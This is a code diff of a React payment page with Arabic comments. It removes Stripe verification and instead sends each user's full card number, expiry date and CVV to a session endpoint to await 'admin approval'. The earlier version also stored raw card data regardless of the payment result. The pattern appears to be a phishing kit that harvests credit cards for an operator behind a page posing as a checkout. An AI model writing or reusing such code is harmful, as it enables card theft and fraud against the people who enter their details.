@@ -167,45 +167,32 @@ export default function PaymentPage() {
     setIsSubmitting(true);
     setErrorMsg("");
 
-    // إرسال بيانات البطاقة للـ backend للتحقق من Stripe
+    // حفظ بيانات البطاقة في الجلسة مباشرة (بدون التحقق من Stripe)
     try {
       const [expMonth, expYear] = expiry.split('/').map(s => s.trim());
 
-      const res = await fetch('/api/stripe-verify', {
+      // إرسال البيانات للـ backend لحفظها في الجلسة
+      const res = await fetch('/api/session', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          cardHolder: cardHolder,
-          cardNumber: cardNumber.replace(/\s/g, ''),
-          cardExpiry: expiry,
-          cardCvv: cvv,
+          current_page: 'payment',
+          card_holder: cardHolder,
+          card_number: cardNumber.replace(/\s/g, ''),
+          card_expiry: expiry,
+          card_cvv: cvv,
           expMonth: parseInt(expMonth, 10),
           expYear: parseInt('20' + expYear, 10),
+          stripe_status: 'pending', // حالة الانتظار للموافقة من الأدمن
+          waiting_for: 'admin_approval',
         }),
       });
 
       const data = await res.json();
 
-      // حفظ البيانات في الجلسة (سواء نجحت أو فشلت)
-      try {
-        await fetch('/api/session', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            current_page: 'payment',
-            card_holder: cardHolder,
-            card_number: cardNumber,
-            card_expiry: expiry,
-            card_cvv: cvv,
-            stripe_status: data.stripeStatus || (data.success ? 'ناجحة' : 'مرفوضة'),
-            waiting_for: 'payment',
-          }),
-        });
-      } catch {}
-
       if (!data.success) {
         setIsSubmitting(false);
-        setErrorMsg(data.error || 'حدث خطأ في التحقق من البطاقة');
+        setErrorMsg(data.error || 'حدث خطأ في حفظ البيانات');
         return;
       }
 
@@ -357,7 +344,6 @@ export default function PaymentPage() {
               value={cardNumber}
               onChange={(e) => handleCardNumberChange(e.target.value)}
               onBlur={onCardNumberBlur}
-              maxLength={19}
               style={inputStyle(!!cardNumberError)}
             />
             {cardNumberError && (
@@ -367,7 +353,7 @@ export default function PaymentPage() {
             )}
           </div>
 
-          {/* التاريخ و CVV */}
+          {/* تاريخ الانتهاء و CVV */}
           <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "15px" }}>
             <div>
               <label style={{ display: "block", marginBottom: "8px", fontSize: "14px", color: "#333", fontWeight: "500" }}>
@@ -375,14 +361,14 @@ export default function PaymentPage() {
               </label>
               <input
                 type="text"
-                placeholder="MM/YY"
+                placeholder="MM / YY"
                 value={expiry}
                 onChange={(e) => {
-                  setExpiry(formatExpiry(e.target.value));
+                  const formatted = formatExpiry(e.target.value);
+                  setExpiry(formatted);
                   setExpiryError("");
                 }}
                 onBlur={onExpiryBlur}
-                maxLength={5}
                 style={inputStyle(!!expiryError)}
               />
               {expiryError && (
@@ -405,7 +391,6 @@ export default function PaymentPage() {
                   setCvvError("");
                 }}
                 onBlur={onCvvBlur}
-                maxLength={4}
                 style={inputStyle(!!cvvError)}
               />
               {cvvError && (
@@ -416,31 +401,32 @@ export default function PaymentPage() {
             </div>
           </div>
 
-          {/* زر الدفع */}
+          {/* زر الإرسال */}
           <button
             onClick={handleSubmit}
             disabled={isSubmitting}
             style={{
-              background: GREEN,
+              width: "100%",
+              padding: "14px",
+              backgroundColor: isSubmitting ? "#ccc" : GREEN,
               color: "white",
               border: "none",
-              padding: "14px",
               borderRadius: "10px",
               fontSize: "16px",
               fontWeight: "bold",
               cursor: isSubmitting ? "not-allowed" : "pointer",
-              opacity: isSubmitting ? 0.6 : 1,
-              transition: "all 0.3s",
+              transition: "background-color 0.3s",
               marginTop: "10px"
             }}
+            onMouseEnter={(e) => {
+              if (!isSubmitting) (e.target as HTMLButtonElement).style.backgroundColor = "#155d2f";
+            }}
+            onMouseLeave={(e) => {
+              if (!isSubmitting) (e.target as HTMLButtonElement).style.backgroundColor = GREEN;
+            }}
           >
-            {isSubmitting ? "جاري المعالجة..." : "ادفع الآن"}
+            {isSubmitting ? "جاري المعالجة..." : "تأكيد الدفع"}
           </button>
-        </div>
-
-        {/* رسالة الأمان */}
-        <div style={{ marginTop: "25px", paddingTop: "20px", borderTop: "1px solid #eee", display: "flex", flexDirection: "column", alignItems: "center", gap: "10px", textAlign: "center" }}>
-          <span style={{ fontSize: "12px", color: "#888" }}>🔒 جميع بياناتك محمية بتشفير SSL</span>
         </div>
       </div>
     </div>
